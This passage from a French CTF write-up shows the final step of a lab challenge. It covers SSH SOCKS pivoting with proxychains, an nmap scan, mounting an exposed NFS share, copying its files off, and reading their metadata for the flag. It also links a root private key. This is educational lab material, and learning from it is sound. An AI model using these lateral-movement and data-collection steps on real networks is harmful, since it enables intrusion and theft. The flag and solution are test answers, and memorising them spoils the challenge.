Manuel du ROP à l&rsquo;usage des débutants</em>, dailysecurity : <a href=https://www.dailysecurity.fr/return_oriented_programming/ target=_blank rel="noopener noreffer">https://www.dailysecurity.fr/return_oriented_programming/</a></li></ol><hr><hr><h2 id=xiii-step-13---the-final-countdown>XIII. Step 13 - The final countdown</h2><blockquote><p>SHA256(WillyWonka&rsquo;s chief name)</p></blockquote><h3 id=tldr-12>TL;DR</h3><ol><li>Trouver la machine qui manque sur le schéma réseau avec arp : <code>cat /proc/net/arp</code> ;</li><li>Mettre en place un <strong>proxychains</strong> avec la machine précédente en tant que pivot ;</li><li>Faire un scan de port avec nmap sur la nouvelle cible, voir le <code>nfs</code> sur le port 2049 ;</li><li>Monter le nfs distant sur la machine de pivot ;</li><li>Copier les fichiers du partage réseau ;</li><li>Analyser les métadonnées avec <strong>exiftool</strong> et trouver que <strong>Grandma Josephine</strong> est le chef de <em>Willy Wonka</em>.</li></ol><hr><h3 id=xiii1-post-exploitation>XIII.1. Post exploitation</h3><p>Le schéma trouvé sur le serveur <em>SRV01-INTRANET</em> est incomplet. En effet, la machine <strong>SRV03-FILER</strong> est tagguée en tant que &ldquo;TODO&rdquo;. L&rsquo;épreuve finale doit consister en l&rsquo;accès à cette dernière machine. Avant de passer à la suite, il convient de se connecter en <em>root</em> au serveur <em>SRV02-BACKUP</em> avec un réel accès SSH. La clé privée est disponible <a href=https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc target=_blank rel="noopener noreffer">ici</a>.</p><p>L&rsquo;objectif est de trouver le chef de <em>Willy Wonka</em>. Comme pour la première étape de la dixième épreuve (cf. X.1. Reconnaissance), il est intéressant de vérifier le contenu du cache arp :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as root<span class=o>)</span> ➜ cat /proc/net/arp
</span></span><span class=line><span class=cl>IP address       HW <span class=nb>type</span>     Flags       HW address            Mask     Device
</span></span><span class=line><span class=cl>172.16.69.23     0x1         0x2         ce:d3:94:6c:38:3f     *        ens18
</span></span><span class=line><span class=cl>172.16.69.78     0x1         0x2         7a:0a:61:1a:36:65     *        ens18
</span></span><span class=line><span class=cl>172.16.69.254    0x1         0x2         3e:20:13:a5:09:49     *        ens18
</span></span></code></pre></td></tr></table></div></div><p>Une nouvelle IP est apparut : <strong>172.16.69.23</strong>. Sûrement la machine nommée <strong>SRV03-FILER</strong>. Celle-ci n&rsquo;a pas l&rsquo;air accessible directement malgré les routes en place. Cependant, ayant un accès SSH à la machine <em>SRV02-BACKUP</em>, il est possible de faire un pivot.</p><h3 id=xiii2-mise-en-place-du-pivot>XIII.2. Mise en place du pivot</h3><p>Pour faire un pivot, il existe au moins deux outils pertinents : <strong>proxychains</strong> et <strong>sshuttle</strong>. Dans les deux cas, il est nécessaire de faire suivre un port de la machine pivot (SRV02-BACKUP) et la machine de l&rsquo;attaquant (KaliVM). Pour cette configuration, l&rsquo;architecture présentée dans l&rsquo;introduction a été abandonnée. Le <em>VPN du WonkaChall</em> est directement dans la <em>KaliVM</em>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ssh -D <span class=m>1080</span> root@172.16.69.65 -i ./id_rsa_root
</span></span></code></pre></td></tr></table></div></div><p>La configuration de proxychains :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=c1># Quiet mode (no output from library)</span>
</span></span><span class=line><span class=cl>quiet_mode
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>socks4 	127.0.0.1 <span class=m>1080</span>
</span></span></code></pre></td></tr></table></div></div><p>Le pivot est désormais mis en place. Il est possible pour la <em>KaliVM</em> d&rsquo;accéder à <strong>SRV03-FILER</strong>.</p><h3 id=xiii3-scan-de-port>XIII.3. Scan de port</h3><p>Le scan de port devenant une coutume lors de la découverte d&rsquo;un nouvel hôte, celui-ci ne va pas échapper à la règle :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ proxychains nmap -F -sT -Pn -T4 -vvv 172.16.69.23 
</span></span><span class=line><span class=cl>ProxyChains-3.1 <span class=o>(</span>http://proxychains.sf.net<span class=o>)</span>
</span></span><span class=line><span class=cl>Starting Nmap 7.70 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2019-07-22 01:16 CEST
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack
</span></span><span class=line><span class=cl>111/tcp  open  rpcbind syn-ack
</span></span><span class=line><span class=cl>2049/tcp open  nfs     syn-ack
</span></span></code></pre></td></tr></table></div></div><p>En considérant les trois ports ouverts, l&rsquo;hypothèse la plus probable est l&rsquo;accès au <strong>Network File System</strong> (nfs) sur le port <em>2049/tcp</em>.</p><h3 id=xiii4-montage-du-volume-nfs>XIII.4. Montage du volume NFS</h3><p>La tentative de montage en passant par <em>proxychains</em> est un échec. La solution la plus simple est de monter ce volume sur le serveur <em>SRV02-BACKUP</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as root<span class=o>)</span> ➜ mkdir /tmp/a
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as root<span class=o>)</span> ➜ mount -t nfs 172.16.69.23:/ /tmp/a
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as root<span class=o>)</span> ➜ ls /tmp/a
</span></span><span class=line><span class=cl>DATA
</span></span></code></pre></td></tr></table></div></div><p>Le volume est monté avec succès. Il contient beaucoup <em>d&rsquo;images</em>, un <em>docx</em> et un <em>pdf</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as root<span class=o>)</span> ➜  ls -laR /tmp/a/DATA
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>./pictures:
</span></span><span class=line><span class=cl>total <span class=m>11652</span>
</span></span><span class=line><span class=cl>drwxr-x--x  <span class=m>2</span> nobody nogroup    <span class=m>4096</span> juil.  <span class=m>4</span> 10:51 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>11</span> root   root       <span class=m>4096</span> juin  <span class=m>24</span> 17:43 ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>131823</span> juil.  <span class=m>4</span> 10:50 ascenseurRedTeam.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>1901579</span> juil.  <span class=m>4</span> 10:50 cinemaRedTeam.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>196371</span> juil.  <span class=m>4</span> 10:50 croissantageSaif.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>130839</span> juil.  <span class=m>4</span> 10:50 demenagement.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>153995</span> juil.  <span class=m>4</span> 10:50 glace.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup   <span class=m>37247</span> juil.  <span class=m>4</span> 10:50 kenkenken.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>138224</span> juil.  <span class=m>4</span> 10:50 keskiamaintenant.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>190794</span> juil.  <span class=m>4</span> 10:50 miam.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>116749</span> juil.  <span class=m>4</span> 10:50 newyork.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup   <span class=m>86819</span> juil.  <span class=m>4</span> 10:50 notredame.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>965251</span> juil.  <span class=m>4</span> 10:50 onPartEnRestitution.jpg
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>2196730</span> juil.  <span class=m>4</span> 10:50 onVeutDuPain.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>1039727</span> juil.  <span class=m>4</span> 10:50 plage.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>104879</span> juil.  <span class=m>4</span> 10:50 redabogoss.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>137275</span> juil.  <span class=m>4</span> 10:50 redaSport.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>2043318</span> juil.  <span class=m>4</span> 10:50 rootagedADsurDouchette.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>182331</span> juil.  <span class=m>4</span> 10:50 rootagedemeres.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>1968672</span> juil.  <span class=m>4</span> 10:50 soireeAvantPentest.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup   <span class=m>69753</span> juil.  <span class=m>4</span> 10:50 soireepicol.png
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup   <span class=m>93357</span> juil.  <span class=m>4</span> 10:50 toiletteAmehdi.png
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>./VIP:
</span></span><span class=line><span class=cl>total <span class=m>408</span>
</span></span><span class=line><span class=cl>drwxr-x--x  <span class=m>2</span> nobody nogroup   <span class=m>4096</span> juil.  <span class=m>5</span> 16:59 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>11</span> root   root      <span class=m>4096</span> juin  <span class=m>24</span> 17:43 ..
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>88168</span> juil.  <span class=m>5</span> 16:58 flag_lol.jpg
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup  <span class=m>30234</span> juil.  <span class=m>3</span> 19:15 INVOICE.docx
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>127983</span> juil.  <span class=m>3</span> 19:15 INVOICE.pdf
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> nobody nogroup <span class=m>152189</span> juil.  <span class=m>5</span> 16:58 whiteboard.jpg
</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;identité du chef de Willy Wonka doit se trouver dans les métadonnées d&rsquo;un des fichiers du volume.</p><h3 id=xiii5-copie-des-fichiers-du-volume>XIII.5. Copie des fichiers du volume</h3><p>Encore une fois, la solution la plus simple et la plus rapide reste de copier l&rsquo;ensemble des fichiers du dossier <strong>VIP</strong> sur <em>KaliVM</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ scp -r -i ../id_rsa_root root@172.16.69.65:/tmp/a/DATA/VIP/ .    
</span></span><span class=line><span class=cl>INVOICE.pdf                                                                       100%  125KB   1.9MB/s   00:00    
</span></span><span class=line><span class=cl>flag_lol.jpg                                                                      100%   86KB   2.6MB/s   00:00    
</span></span><span class=line><span class=cl>INVOICE.docx                                                                      100%   30KB   1.9MB/s   00:00    
</span></span><span class=line><span class=cl>whiteboard.jpg                                                                    100%  149KB   3.1MB/s   00:00  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ exiftool * <span class=p>|</span> grep -i <span class=s1>&#39;author&#39;</span>
</span></span><span class=line><span class=cl>Author                          : Grandma Josephine
</span></span></code></pre></td></tr></table></div></div><p>Le flag final est le SHA256 de &ldquo;Grandma Josephine&rdquo;.</p><h3 id=xiii6-flag>XIII.6. Flag</h3><blockquote><p>b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9</p></blockquote><hr><h3 id=resources-10>Resources</h3><ol><li><strong>Bima Fajar Ramadhan</strong>, <em>ProxyChains Tutorial</em>, linuxhint : <a href=https://linuxhint.com/proxychains-tutorial/ target=_blank rel="noopener noreffer">https://linuxhint.com/proxychains-tutorial/</a></li><li><strong>Equipe de developpez</strong>, <em>NFS : le partage de fichiers sous Unix</em>, developpez.com : <a href=https://linux.developpez.com/formation_debian/nfs.html target=_blank rel="noopener noreffer">https://linux.developpez.com/formation_debian/nfs.html</a></li></ol><hr><hr><h2 id=conclusion>Conclusion</h2><p>Pour conclure, le WonkaChallenge d&rsquo;Akerva m&rsquo;a permis de travailler sur des technologies à jour, et ça a été vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourues. D&rsquo;un point de vue plus personnel, j&rsquo;ai appris plusieurs choses : interagir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l&rsquo;active directory et enfin le ret2plt.</p><p>Enfin, l&rsquo;infrastructure du challenge a très bien résisté à l&rsquo;assaut de plusieurs dizaines (centaines ?) de challengers. C&rsquo;était agréable de pouvoir travailler sur le challenge sans bugs ou autres problèmes de stabilité. Seule l&rsquo;utilisation du psexec juste après l&rsquo;exploitation du rbcd a été un peu chaotique.</p><p>Pour clore ce writeup, je souhaite remercier l&rsquo;équipe d&rsquo;Akerva en charge du challenge. C&rsquo;était de belles épreuves, et j&rsquo;ai hâte de jouer le Wonka3 l&rsquo;année prochaine !</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/flag_lol.jpg data-srcset="/lib/images/writeups/2019_wonkachallenge/flag_lol.jpg, /lib/images/writeups/2019_wonkachallenge/flag_lol.jpg 1.5x, /lib/images/writeups/2019_wonkachallenge/flag_lol.jpg 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/flag_lol.jpg title=/lib/images/writeups/2019_wonkachallenge/flag_lol.jpg></p></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>